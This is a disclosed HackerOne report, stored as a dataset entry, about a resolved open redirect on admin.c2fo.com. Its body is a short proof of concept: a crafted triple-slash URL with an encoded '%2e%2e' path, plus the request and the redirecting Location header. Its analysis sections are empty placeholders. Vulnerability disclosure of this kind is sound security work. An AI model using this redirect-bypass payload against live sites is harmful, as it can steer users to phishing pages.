---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '39198'
original_report_id: '39198'
title: '[admin.c2fo.com] Open Redirect'
weakness: Open Redirect
team_handle: c2fo
created_at: '2014-12-12T20:54:33.762Z'
disclosed_at: '2016-10-29T16:08:53.614Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 10
tags:
- hackerone
- open-redirect
---

# [admin.c2fo.com] Open Redirect

## Metadata

- HackerOne Report ID: 39198
- Weakness: Open Redirect
- Program: c2fo
- Disclosed At: 2016-10-29T16:08:53.614Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

PoC (FireFox):
https://admin.c2fo.com///www.google.com/%2e%2e

HTTP Request:
GET ///www.google.com/%2e%2e HTTP/1.1
Host: admin.c2fo.com

HTTP Response:
Location: //www.google.com/%2e%2e/

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
